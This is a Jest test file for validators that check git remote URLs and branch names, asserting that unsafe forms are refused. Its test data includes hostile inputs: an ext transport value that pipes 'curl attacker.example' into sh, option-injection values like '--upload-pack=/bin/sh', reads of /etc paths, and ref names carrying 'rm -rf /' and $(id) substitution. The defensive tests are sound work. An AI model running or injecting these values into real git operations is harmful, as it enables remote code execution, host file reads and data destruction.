import { UnsafeRemoteUrlError, assertSafeRefName, assertSafeRemoteUrl } from './git-url';

/**
 * These tests assert refusal, not acceptance. A URL validator that only proves it
 * accepts good input is worthless: what matters is that it rejects the forms that
 * turn a clone into command execution or a read of the platform host.
 */
describe('assertSafeRemoteUrl', () => {
  it('accepts an https remote', () => {
    const remote = assertSafeRemoteUrl('https://github.com/linkederp/omnisurge.git');
    expect(remote.scheme).toBe('https');
    expect(remote.host).toBe('github.com');
    expect(remote.path).toBe('linkederp/omnisurge.git');
    expect(remote.isLocal).toBe(false);
  });

  it('accepts and normalises an scp-style ssh remote, keeping the account', () => {
    const remote = assertSafeRemoteUrl('git@github.com:linkederp/omnisurge.git');
    expect(remote.scheme).toBe('ssh');
    expect(remote.host).toBe('github.com');
    expect(remote.path).toBe('linkederp/omnisurge.git');
    // git@ names the SSH account, not a secret, and git needs it.
    expect(remote.sshUser).toBe('git');
    expect(remote.url).toBe('ssh://git@github.com/linkederp/omnisurge.git');
  });

  it('accepts an explicit ssh:// remote with an account', () => {
    const remote = assertSafeRemoteUrl('ssh://git@gitlab.com/group/repo.git');
    expect(remote.scheme).toBe('ssh');
    expect(remote.sshUser).toBe('git');
  });

  it('never carries a username on an https remote', () => {
    expect(assertSafeRemoteUrl('https://github.com/a/b.git').sshUser).toBeNull();
  });

  describe('refuses command execution', () => {
    it('rejects the ext transport, which runs an arbitrary command', () => {
      for (const url of [
        'ext::sh -c "curl attacker.example | sh"',
        'ext::whoami',
        'EXT::sh -c id',
      ]) {
        expect(() => assertSafeRemoteUrl(url)).toThrow(/ext transport/i);
      }
    });

    it('rejects a URL that git would read as an option', () => {
      for (const url of ['--upload-pack=/bin/sh', '-u./payload', '--help']) {
        expect(() => assertSafeRemoteUrl(url)).toThrow(UnsafeRemoteUrlError);
      }
    });
  });

  describe('refuses reading the platform host', () => {
    it('rejects file:// by default', () => {
      expect(() => assertSafeRemoteUrl('file:///etc')).toThrow(/platform host/i);
      expect(() => assertSafeRemoteUrl('file:///home/other/workspace')).toThrow(
        UnsafeRemoteUrlError,
      );
    });

    it('accepts file:// only when explicitly enabled', () => {
      const remote = assertSafeRemoteUrl('file:///tmp/fixture.git', { allowLocal: true });
      expect(remote.isLocal).toBe(true);
      expect(remote.scheme).toBe('file');
    });

    it('rejects a bare local path', () => {
      for (const url of ['/etc/passwd', './repo', '../repo', 'C:/Windows']) {
        expect(() => assertSafeRemoteUrl(url)).toThrow(UnsafeRemoteUrlError);
      }
    });
  });

  describe('refuses unsafe transports', () => {
    it('rejects plaintext and unauthenticated schemes', () => {
      expect(() => assertSafeRemoteUrl('http://github.com/a/b.git')).toThrow(/https/i);
      expect(() => assertSafeRemoteUrl('git://github.com/a/b.git')).toThrow(/unauthenticated/i);
      expect(() => assertSafeRemoteUrl('ftp://host/a.git')).toThrow(UnsafeRemoteUrlError);
    });
  });

  describe('refuses credential leakage', () => {
    it('rejects an https URL embedding a token', () => {
      expect(() =>
        assertSafeRemoteUrl('https://x-access-token:ghp_secret@github.com/a/b.git'),
      ).toThrow(/embeds a password/i);
      // A username alone is how a token is smuggled, so it is refused too.
      expect(() => assertSafeRemoteUrl('https://user@github.com/a/b.git')).toThrow(
        /embeds credentials/i,
      );
    });

    it('rejects a password even on an ssh remote, where a username is fine', () => {
      expect(() => assertSafeRemoteUrl('ssh://git:secret@github.com/a/b.git')).toThrow(
        /embeds a password/i,
      );
    });
  });

  describe('refuses malformed input', () => {
    it('rejects empty, over-long and non-string values', () => {
      expect(() => assertSafeRemoteUrl('')).toThrow(/empty/i);
      expect(() => assertSafeRemoteUrl('   ')).toThrow(/empty/i);
      expect(() => assertSafeRemoteUrl(`https://host/${'a'.repeat(3000)}`)).toThrow(/2048/);
      expect(() => assertSafeRemoteUrl(null as unknown as string)).toThrow(/not a string/i);
    });

    it('rejects a control character, which could split a config file', () => {
      const newline = String.fromCharCode(10);
      const nul = String.fromCharCode(0);
      expect(() => assertSafeRemoteUrl(`https://host/a.git${newline}[core]`)).toThrow(
        /control character/i,
      );
      expect(() => assertSafeRemoteUrl(`https://host/a${nul}b.git`)).toThrow(
        /control character/i,
      );
    });

    it('rejects a remote with no repository path', () => {
      expect(() => assertSafeRemoteUrl('https://github.com')).toThrow(/no repository path/i);
      expect(() => assertSafeRemoteUrl('https://github.com/')).toThrow(/no repository path/i);
    });

    it('rejects a query string or fragment', () => {
      expect(() => assertSafeRemoteUrl('https://host/a.git?x=1')).toThrow(/query string/i);
      expect(() => assertSafeRemoteUrl('https://host/a.git#frag')).toThrow(/query string/i);
    });
  });
});

describe('assertSafeRefName', () => {
  it('accepts the branch names the platform generates', () => {
    for (const name of [
      'main',
      'ai/task_9281-vat-rounding-fix',
      'release/18.0',
      'feature_x.1',
    ]) {
      expect(assertSafeRefName(name)).toBe(name);
    }
  });

  it('rejects a name that would be read as a command option', () => {
    expect(() => assertSafeRefName('--upload-pack=evil')).toThrow(UnsafeRemoteUrlError);
    expect(() => assertSafeRefName('-x')).toThrow(UnsafeRemoteUrlError);
  });

  it('rejects shell metacharacters and spaces', () => {
    for (const name of ['branch;rm -rf /', 'branch name', 'a&&b', 'a|b', 'a$(id)', 'a`id`']) {
      expect(() => assertSafeRefName(name)).toThrow(UnsafeRemoteUrlError);
    }
  });

  it("rejects the names git itself refuses", () => {
    for (const name of ['a..b', 'a//b', 'a.lock', 'trailing.', '/leading', 'trailing/']) {
      expect(() => assertSafeRefName(name)).toThrow(UnsafeRemoteUrlError);
    }
  });

  it('rejects empty, over-long and control-character names', () => {
    expect(() => assertSafeRefName('')).toThrow(UnsafeRemoteUrlError);
    expect(() => assertSafeRefName('a'.repeat(201))).toThrow(UnsafeRemoteUrlError);
    expect(() => assertSafeRefName(`a${String.fromCharCode(10)}b`)).toThrow(
      /control character/i,
    );
  });
});
